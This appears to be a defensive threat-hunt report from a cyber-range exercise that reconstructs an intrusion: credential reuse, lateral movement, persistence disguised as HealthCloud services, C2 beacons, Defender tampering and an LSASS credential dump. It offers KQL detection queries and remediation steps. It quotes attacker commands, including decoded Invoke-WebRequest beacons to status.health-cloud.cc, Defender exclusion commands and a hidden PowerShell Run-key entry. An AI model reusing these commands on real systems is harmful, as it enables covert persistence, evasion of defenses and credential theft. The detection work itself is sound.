# 🔴 SIGNALS AFTER THE NOISE 2

## Post-Intrusion Hunt — Operator Activity Reconstruction

> **Hunt:** 06 &nbsp;|&nbsp; **Workspace:** LAW-Cyber-Range &nbsp;|&nbsp; **Window:** 2025-12-13 09:00–18:00 UTC &nbsp;|&nbsp; **Anchor:** 09:48 UTC

| Field | Value |
| --- | --- |
| **Primary Host** | `azwks-phtg-01` |
| **Secondary Host** | `azwks-phtg-02` |
| **Compromised Account** | `vmadminusername` |
| **Initial Vector** | Credential Reuse (T1078) — not brute force |
| **C2 Infrastructure** | `updates.health-cloud.cc` / `status.health-cloud.cc` |
| **Final Action** | LSASS `ReadProcessMemoryApiCall` — credentials confirmed dumped |
| **Flags Captured** | 29 / 29 |
| **Phases** | 8 gated |

* * *

## 📋 Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Attack Narrative & Timeline](#2-attack-narrative--timeline)
3. [Phase Analysis](#3-phase-analysis)
4. [Persistence Framework](#4-persistence-framework)
5. [C2 Infrastructure](#5-c2-infrastructure)
6. [Credential Theft — LSASS](#6-credential-theft--lsass)
7. [Indicators of Compromise](#7-indicators-of-compromise)
8. [KQL Detection Playbook](#8-kql-detection-playbook)
9. [Recommendations & Remediation](#9-recommendations--remediation)

* * *

## 1. Executive Summary

This hunt reconstructs operator activity on the PHTG estate following the confirmed initial access established in Hunt 05. The operator's activity consistently mimicked legitimate HealthCloud administration — nearly all of it looked like routine maintenance. The value of this hunt is in identifying **deliberate intent hidden inside ordinary-looking telemetry**.

The operator entered via **credential reuse** (T1078), moved laterally from `azwks-phtg-02` to `azwks-phtg-01`, deployed a full persistence framework masquerading as HealthCloud services, established dual C2 channels to attacker-controlled infrastructure, tampered with Windows Defender, and concluded with a confirmed LSASS memory read — credential theft proven by telemetry.

### Key Statistics

| Metric | Value |
| --- | --- |
| Flags Captured | **29 / 29** |
| Hunt Phases | **8** |
| Hosts Compromised | **2** — `azwks-phtg-01` + `azwks-phtg-02` |
| Registry Modifications | **280** under `vmadminusername` |
| Healthcheck Beacons | **22** executions |
| Persistence Mechanisms | **3** — Run key + Startup LNK + Event log registration |
| Defender Exclusions | **2** — Cache path + SvcExe process |
| Confirmed Credential Theft | **Yes** — `ReadProcessMemoryApiCall` on lsass.exe |

* * *

## 2. Attack Narrative & Timeline

    09:48:34  LATERAL MOVEMENT
              vmadminusername authenticates from 10.0.0.152 (azwks-phtg-02) → azwks-phtg-01
              Credential reuse — NOT brute force — T1078
    
    10:11:42  FIRST OPERATOR SCRIPT
              _.ps1 executed: -WindowStyle Hidden -ExecutionPolicy Bypass
              Temporary Defender exclusion added → script runs → exclusion removed
    
    10:12:16  TOOL PULL FROM C2
              Outbound to updates.health-cloud.cc — T1105 Ingress Tool Transfer
    
    10:12:17  BEACON LOOP BEGINS
              PHTGHealthCloudSvc.exe /healthcheck /flag:FLAG-01 (22 executions total)
    
    10:12:18  DEFENDER EXCLUSION — PATH
              Add-MpPreference -ExclusionPath Cache -Force
    
    10:12:27  ATTRIBUTE HIDING
              attrib +h +s — Cache (17 ops) + TempCache (3 ops) — T1564.001
    
    10:13:00  STARTUP PERSISTENCE
              PHTG HealthCloud.lnk dropped in Startup folder — T1547.001
    
    10:13:01  RUN KEY PERSISTENCE
              PHTGHealthCloudTray → HealthCloudTray.ps1 written to HKCU Run key
    
    10:13:43  ENCODED BEACON 1
              Invoke-WebRequest → status.health-cloud.cc/api/checkin?flag=FLAG-09
    
    10:13:56  ENCODED BEACON 2
              Invoke-WebRequest → status.health-cloud.cc/api/status?flag=FLAG-10
    
    10:14:10  AMSI PROBE
              amsi_probe.ps1 — testing AV scan interface before main payload
    
    10:14:29  DEFENDER EXCLUSION — PROCESS
              Add-MpPreference -ExclusionProcess PHTGHealthCloudSvc.exe -Force
    
    10:14:37  LSASS HANDLE — PROBE
              OpenProcessApiCall lsass.exe DesiredAccess 0x1410 (PROCESS_QUERY_INFORMATION)
    
    10:14:38  LSASS HANDLE — FULL ACCESS
              OpenProcessApiCall lsass.exe DesiredAccess 0x1F0FFF (PROCESS_ALL_ACCESS)
    
    10:14:38  🔴 CREDENTIAL DUMP CONFIRMED
              ReadProcessMemoryApiCall — credentials read from lsass.exe memory
    
    10:15:15  LINEAGE BREAK
              cmd.exe /c powershell.exe hc_lineage.ps1 — parent-child lineage broken
    
    10:16:09  FINAL STAGE
              cmd.exe /c phtg_health_diag_update_FLAG-22.bat

* * *

## 3. Phase Analysis

### Phase 01 — Cold Trail: Credential Reuse

The hunt brief assumed brute force. The telemetry proved otherwise.

| IP  | Failed Logons | Successful Logons | Verdict |
| --- | --- | --- | --- |
| `173.244.55.131` | 4   | 13  | Same account both sides — credential reuse |
| `173.244.55.128` | 8   | 8   | Same account both sides — credential reuse |
| `142.111.152.58` | **0** | 4   | Zero failures — credentials known in advance |
| `173.239.218.124` | **0** | 2   | Zero failures — credentials known in advance |

Two IPs authenticated with **zero failed attempts**. The attacker arrived with `vmadminusername` credentials already in hand. This is T1078 Valid Accounts / Credential Reuse — not T1110 Brute Force.

### Phase 02 — First Footsteps

First operator script at 10:11:42:

    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
    -File "C:\Users\vmAdminUsername\Documents\PHTG\_.ps1"

> **Why `_.ps1`?** Underscore sorts to the bottom of directory listings — designed to be overlooked during casual inspection.

**Three scripts launched in rapid succession:**

| Time | Script | Flags |
| --- | --- | --- |
| 10:11:42 | `_.ps1` | Hidden + Bypass — master operator script |
| 10:14:10 | `amsi_probe.ps1` | NoProfile + Bypass — AV pre-flight check |
| 10:15:15 | `hc_lineage.ps1` | NoProfile + Bypass via cmd.exe wrapper |

### Phase 03 — Quiet Roots

**280 registry modifications** under `vmadminusername` — mostly noise (Desktop themes, MUI cache, CLSID). Two keys that matter:

    HKEY_CURRENT_USER\...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        → PHTGHealthCloudTray = powershell.exe -NoProfile -WindowStyle Hidden
          -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
    
    HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud
        → Custom event log source — enables writing to Application log as trusted source

### Phase 04 — The Beacon Pair

Two parallel C2 mechanisms running simultaneously:

| Channel | Mechanism | Benefit |
| --- | --- | --- |
| `PHTGHealthCloudSvc.exe /healthcheck` | LOLBin masquerade (bitsadmin.exe) | 22 executions — blends with service health checks |
| `Invoke-WebRequest -EncodedCommand` | Encoded PowerShell beacons | Base64 obfuscated — evades simple string detection |

**Why two channels?** Resilience (one survives if the other is cut) + detection splitting (neither channel alone crosses the alert threshold).

### Phase 05 — Outbound Whispers

| Domain | Role | First Seen |
| --- | --- | --- |
| `updates.health-cloud.cc` | Tool delivery — payload pull | 10:12:16 |
| `status.health-cloud.cc` | Beacon callbacks — check-in/status | 10:13:44 |
| `raw.githubusercontent.com` | Late-stage LOL delivery | 16:24:46 |

> **TLD Note:** `.cc` chosen to blend with "HealthCloud" branding. `updates.` and `status.` subdomains mimic legitimate cloud service infrastructure.

### Phase 06 — Doors Held Open

**LOLBin masquerade detected:**

* `PHTGHealthCloudSvc.exe` claims `OriginalFileName = bitsadmin.exe`
* Only detectable via `FileName != ProcessVersionInfoOriginalFileName`
* Every other mismatch in the 488-row dataset was case-only (`EXPLORER.EXE` vs `explorer.exe`)

**Temporary exclusion pattern (sophisticated anti-forensics):**

    Add-MpPreference -ExclusionPath "C:\Users\vmAdminUsername\Documents\PHTG"
    # ... execute _.ps1 ...
    Remove-MpPreference -ExclusionPath "C:\Users\vmAdminUsername\Documents\PHTG"

Exclusion existed only for seconds — no permanent registry trace left behind.

### Phase 07 — Hands on the Vault

Three-step LSASS credential dump confirmed:

    Step 1: OpenProcessApiCall  DesiredAccess=5136    (0x1410)   PROCESS_QUERY_INFORMATION — probe
    Step 2: OpenProcessApiCall  DesiredAccess=2047999 (0x1F0FFF) PROCESS_ALL_ACCESS — escalate
    Step 3: ReadProcessMemoryApiCall                             CONFIRMED — memory read, creds dumped

* * *

## 4. Persistence Framework

| Mechanism | Artefact | Status |
| --- | --- | --- |
| **Run Key** | `PHTGHealthCloudTray` → `HealthCloudTray.ps1` | ✅ Confirmed fired x2 |
| **Startup Folder** | `PHTG HealthCloud.lnk` | ⚠️ Detected by Defender — NOT blocked (passive mode) |
| **Event Log Registration** | `PHTGHealthCloud` in Application log | ✅ Active |
| **Defender Path Exclusion** | `C:\ProgramData\PHTG\HealthCloud\Cache` | ✅ Active |
| **Defender Process Exclusion** | `PHTGHealthCloudSvc.exe` | ✅ Active |

### Operator Signature Flags

Every deliberate operator execution carried these three PowerShell flags:

| Flag | Value | Purpose |
| --- | --- | --- |
| `-NoProfile` | —   | Skip profile loading — faster, avoids profile-based logging |
| `-WindowStyle` | `Hidden` | No visible window — user never sees execution |
| `-ExecutionPolicy` | `Bypass` | Run unsigned scripts — no restrictions |

> **Detection rule:** Any PowerShell process in a Run key or Startup entry carrying all three of these flags is operator tooling. Legitimate software never configures persistence this way.

* * *

## 5. C2 Infrastructure

| Domain | Role | Mechanism |
| --- | --- | --- |
| `updates.health-cloud.cc` | Tool delivery / payload pull | `Invoke-WebRequest` plain PowerShell |
| `status.health-cloud.cc` | Beacon callbacks | `Invoke-WebRequest` `-EncodedCommand` |
| `health-cloud.cc` | Parent attacker domain | `.cc` TLD typosquats HealthCloud brand |

### Decoded Beacon Examples

    # Beacon 1 (10:13:43) — decoded from base64
    Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?flag=FLAG-09&device=azwks-phtg-01" -TimeoutSec 5 | Out-Null
    
    # Beacon 2 (10:13:56) — decoded from base64
    Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&device=azwks-phtg-01" -TimeoutSec 5 | Out-Null

### Deployment Pattern (T1105)

    10:12:16  Outbound call to updates.health-cloud.cc  ← PULL (ingest tool)
    10:12:17  PHTGHealthCloudSvc.exe executes            ← EXECUTE (run pulled tool)

One second apart — pull then execute. Repeated 22 times across FLAG-01 through FLAG-22.

* * *

## 6. Credential Theft — LSASS

**Script:** `C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-13.ps1`(hidden with `attrib +h +s`, excluded from Defender, executed at 10:14:37)

| Step | ActionType | DesiredAccess (Dec) | Hex | Meaning |
| --- | --- | --- | --- | --- |
| 1   | `OpenProcessApiCall` | 5136 | `0x1410` | `PROCESS_QUERY_INFORMATION` — low privilege probe |
| 2   | `OpenProcessApiCall` | **2047999** | **`0x1F0FFF`** | **`PROCESS_ALL_ACCESS`** — full unrestricted |
| 3   | `ReadProcessMemoryApiCall` | —   | —   | **CONFIRMED: memory read — credentials dumped** |

> **`PROCESS_ALL_ACCESS` (0x1F0FFF) on lsass.exe from a non-system PowerShell process is one of the highest-fidelity credential theft indicators in Windows telemetry.**

* * *

## 7. Indicators of Compromise

### Host IOCs

| Type | Value | Description | Severity |
| --- | --- | --- | --- |
| PROCESS | `PHTGHealthCloudSvc.exe` | Masquerades as `bitsadmin.exe` — 22 beacon executions | 🔴 CRITICAL |
| SCRIPT | `_.ps1` | Master operator script — Hidden+Bypass | 🔴 CRITICAL |
| SCRIPT | `HealthCloudTray.ps1` | Run key persistence payload | 🟠 HIGH |
| SCRIPT | `amsi_probe.ps1` | AMSI detection probe | 🟠 HIGH |
| SCRIPT | `hc_lineage.ps1` | Lineage enumeration via cmd.exe | 🟠 HIGH |
| FILE | `PHTG HealthCloud.lnk` | Startup folder persistence | 🟠 HIGH |
| PATH | `C:\ProgramData\PHTG\HealthCloud\Cache` | Hidden artefact directory (attrib +h +s) | 🟠 HIGH |
| REGKEY | `HKCU\...\CurrentVersion\Run\PHTGHealthCloudTray` | Run key persistence | 🔴 CRITICAL |
| REGKEY | `HKLM\...\EventLog\Application\PHTGHealthCloud` | Custom event log source | 🟠 HIGH |
| ACCOUNT | `vmadminusername` | Compromised — used across both hosts | 🔴 CRITICAL |
| ACCESS | `DesiredAccess 0x1F0FFF` on lsass.exe | PROCESS_ALL_ACCESS — credential dump | 🔴 CRITICAL |

### Network IOCs

| Type | Value | Role | Severity |
| --- | --- | --- | --- |
| FQDN | `updates.health-cloud.cc` | Tool delivery C2 | 🔴 CRITICAL |
| FQDN | `status.health-cloud.cc` | Beacon callback C2 | 🔴 CRITICAL |
| DOMAIN | `health-cloud.cc` | Parent attacker domain | 🔴 CRITICAL |
| IPv4 | `10.0.0.152` | azwks-phtg-02 internal — lateral movement source | 🟠 HIGH |

* * *

## 8. KQL Detection Playbook

### Query 01 — Credential Reuse Detection

    // Compare failed vs successful accounts per IP — credential reuse fingerprint
    DeviceLogonEvents
    | where DeviceName == "azwks-phtg-01"
    | where TimeGenerated between (
        datetime(2025-12-13T09:00:00) .. datetime(2025-12-13T18:00:00))
    | where ActionType in ("LogonFailed", "LogonSuccess")
    | summarize
        FailedAccounts  = make_set_if(AccountName, ActionType == "LogonFailed"),
        SuccessAccounts = make_set_if(AccountName, ActionType == "LogonSuccess"),
        FailCount       = countif(ActionType == "LogonFailed"),
        SuccessCount    = countif(ActionType == "LogonSuccess")
        by RemoteIP
    | where SuccessCount > 0
    | order by SuccessCount desc

### Query 02 — Operator Signature Flags Hunt

    // Every deliberate operator execution carried these three flags
    DeviceProcessEvents
    | where DeviceName == "azwks-phtg-01"
    | where TimeGenerated > datetime(2025-12-13T09:48:40Z)
    | where FileName =~ "powershell.exe"
    | where ProcessCommandLine has_any (
        "-WindowStyle Hidden",
        "-ExecutionPolicy Bypass",
        "-EncodedCommand",
        "-NoProfile")
    | project
        TimeGenerated,
        ProcessCommandLine,
        InitiatingProcessFileName,
        InitiatingProcessAccountName
    | order by TimeGenerated asc

### Query 03 — Decode Encoded PowerShell Beacons

    // Inline base64 decode — no external tools needed
    DeviceProcessEvents
    | where DeviceName == "azwks-phtg-01"
    | where FileName =~ "powershell.exe"
    | where ProcessCommandLine contains "-EncodedCommand"
    | extend EncodedBlob = extract(
        @"-EncodedCommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
    | extend DecodedCommand = base64_decode_tostring(EncodedBlob)
    | project TimeGenerated, ProcessCommandLine, DecodedCommand
    | order by TimeGenerated asc

### Query 04 — Run Key Persistence with Operator Flags

    DeviceRegistryEvents
    | where RegistryKey contains "CurrentVersion\\Run"
    | where ActionType == "RegistryValueSet"
    | where RegistryValueData has_any (
        "-WindowStyle Hidden",
        "-ExecutionPolicy Bypass",
        "-NoProfile")
    | project
        TimeGenerated, DeviceName,
        RegistryValueName, RegistryValueData
    | order by TimeGenerated asc

### Query 05 — LSASS Credential Dump — Full 3-Step Chain

    // Step 1: Non-system LSASS access with DesiredAccess extraction
    DeviceEvents
    | where DeviceName == "azwks-phtg-01"
    | where ActionType == "OpenProcessApiCall"
    | where FileName =~ "lsass.exe"
    | where InitiatingProcessAccountName !in (
        "system", "network service", "local service")
    | extend DesiredAccess = tostring(parse_json(AdditionalFields).DesiredAccess)
    | project TimeGenerated, InitiatingProcessAccountName,
        InitiatingProcessFileName, DesiredAccess
    | order by TimeGenerated asc
    
    // Step 2: Confirm memory read fired (the dump confirmation)
    DeviceEvents
    | where DeviceName == "azwks-phtg-01"
    | where FileName =~ "lsass.exe"
    | where InitiatingProcessAccountName =~ "vmadminusername"
    | summarize count() by ActionType
    | order by count_ desc

### Query 06 — Defender Tampering Detection

    // Catches both Add AND Remove — operators clean up temporary exclusions
    DeviceEvents
    | where ActionType == "PowerShellCommand"
    | extend Command = tostring(parse_json(AdditionalFields).Command)
    | where Command has_any (
        "Add-MpPreference", "Remove-MpPreference",
        "ExclusionPath", "ExclusionProcess",
        "DisableRealtimeMonitoring")
    | project TimeGenerated, DeviceName, Command
    | order by TimeGenerated asc

### Query 07 — LOLBin Masquerade Detection

    // FileName != OriginalFileName under user account = operator tooling
    DeviceProcessEvents
    | where DeviceName == "azwks-phtg-01"
    | where FileName != ProcessVersionInfoOriginalFileName
    | where isnotempty(ProcessVersionInfoOriginalFileName)
    | where InitiatingProcessAccountName =~ "vmadminusername"
    | project
        TimeGenerated, FileName,
        ProcessVersionInfoOriginalFileName,
        ProcessCommandLine, FolderPath
    | order by TimeGenerated asc

### Query 08 — Attrib Hiding Operations

    // Bulk attrib +h +s = hiding artefacts — aggregate by directory
    DeviceProcessEvents
    | where DeviceName == "azwks-phtg-01"
    | where TimeGenerated > datetime(2025-12-13T09:48:40Z)
    | where FileName =~ "attrib.exe"
    | where ProcessCommandLine has_any ("+h", "+s")
    | extend TargetDir = extract(
        @"C:\\ProgramData\\PHTG\\HealthCloud\\([^\\]+)", 1, ProcessCommandLine)
    | summarize AttribCount = count() by TargetDir
    | order by AttribCount desc

* * *

## 9. Recommendations & Remediation

### 🔴 Immediate Actions (0–24 Hours)

* **Isolate both `azwks-phtg-01` and `azwks-phtg-02`** — lateral movement confirmed, both hosts compromised
* **Revoke `vmadminusername` across the entire fleet** — credential reuse confirmed, same creds worked on both hosts
* **Remove Run key entry `PHTGHealthCloudTray`** — persistence fired twice, still active
* **Delete `PHTG HealthCloud.lnk`** from Startup folder — second persistence mechanism
* **Remove Defender exclusions** for `Cache` path and `PHTGHealthCloudSvc.exe` process
* **Block `health-cloud.cc`** at DNS and perimeter firewall — both C2 subdomains
* **Assume ALL credentials from `azwks-phtg-01` are stolen** — `ReadProcessMemoryApiCall` on lsass.exe confirmed
* **Delete entire `C:\ProgramData\PHTG\HealthCloud\`** staging directory after forensic imaging
* **Remove HKLM EventLog registration** for `PHTGHealthCloud`

### 🟠 Short Term (1–2 Weeks)

* **Enforce Defender active mode via GPO** — passive mode allowed payload execution and LNK persistence
* **Alert on `-WindowStyle Hidden -ExecutionPolicy Bypass`** in any Run key or Startup entry
* **Alert on `FileName != ProcessVersionInfoOriginalFileName`** under non-system accounts
* **Alert on `Add-MpPreference` AND `Remove-MpPreference`** — temporary exclusions are anti-forensics
* **Alert on `OpenProcessApiCall` to lsass.exe** from non-system accounts
* **Block outbound on non-standard ports** — alert on any connection to `.cc` TLDs

### 🟢 Long Term (30–90 Days)

* **Implement LSASS Protected Process Light (PPL)** — prevents userland handle access to LSASS entirely
* **Deploy Credential Guard** — moves credentials to isolated VSM, `ReadProcessMemory` returns nothing
* **Implement application allowlisting** — `PHTGHealthCloudSvc.exe` would never have executed
* **New service onboarding must include file baseline** — HealthCloud directory had no integrity monitoring
* **Red team exercise** — simulate credential reuse attack pattern to test detection coverage

* * *

## MITRE ATT&CK Summary

| Technique ID | Name | Phase |
| --- | --- | --- |
| T1078 | Valid Accounts — Credential Reuse | Initial Access |
| T1021.001 | Remote Desktop Protocol | Lateral Movement |
| T1059.001 | PowerShell | Execution |
| T1059.003 | cmd.exe — Lineage Breaking | Execution |
| T1105 | Ingress Tool Transfer | C2  |
| T1027 | Obfuscated Files — Encoded Commands | Defense Evasion |
| T1036.005 | Masquerading: Match Legitimate Name | Defense Evasion |
| T1547.001 | Boot/Logon Autostart: Run Keys + Startup | Persistence |
| T1562.001 | Impair Defenses: Disable/Modify Tools | Defense Evasion |
| T1564.001 | Hide Artifacts: Hidden Files (attrib) | Defense Evasion |
| T1112 | Modify Registry | Defense Evasion |
| T1071.001 | Application Layer Protocol: Web | C2  |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |

* * *

> **Classification:** TLP:RED — Do not share outside authorized personnel**Hunt:** Signals After the Noise 2 — Post-Intrusion Operator Reconstruction**Hosts:** `azwks-phtg-01` / `azwks-phtg-02` &nbsp;|&nbsp; **Account:** `vmadminusername` &nbsp;|&nbsp; **C2:** `health-cloud.cc`
